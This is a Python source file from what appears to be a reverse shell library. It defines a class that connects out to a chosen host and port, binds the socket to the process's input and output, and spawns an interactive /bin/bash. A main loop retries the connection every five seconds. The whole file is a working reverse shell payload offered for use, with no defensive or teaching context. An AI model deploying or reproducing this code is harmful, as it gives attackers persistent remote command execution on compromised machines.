'''
    Copyright 2021 by Zackary Morvan, Cyber M Technologies.
    All rights reserved
    This file is part of the Reverse Shell Lib (RSL), and is released 
    under the "MIT License Agreement". Please see the LICENSE file that
    should have been included as a part of this package
'''

import socket
import os
import sys
import pty
import time

def checkIp(ip: str):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def checkPort(port: str):
    try:
        prt = int(port)
        if prt > 0 and prt < 65556:
            return True

    except ValueError:
        pass
    return False

class NetcatShell:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        try:
            self.s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            self.s.connect((self.host, self.port))
            self.reverse_shell()
        
        except:
            self.kill_connection()
            print("Payload listener unreachable . . .")
     
    def reverse_shell(self):
        os.dup2(self.s.fileno(),0)
        os.dup2(self.s.fileno(),1)
        os.dup2(self.s.fileno(),2)
        self.shell = pty.spawn('/bin/bash')
        os.wait()
        return

    def kill_connection(self):
        self.s.close()  
        return

if __name__ == "__main__":
    args = sys.argv
    error = ""
    if len(args) > 2:
        ip = args[1]
        port = args[2]
    else:
        ip = "127.0.0.1"
        port = 8080
    if checkIp(ip) is True:
        if checkPort(port) is True:
            port = int(port)
            while True:
                Shell = NetcatShell(ip, port)
                time.sleep(5)
        else:
            error = "Invalid port for payload"
    else:
        error = "Invalid ip address for payload"
    print(error)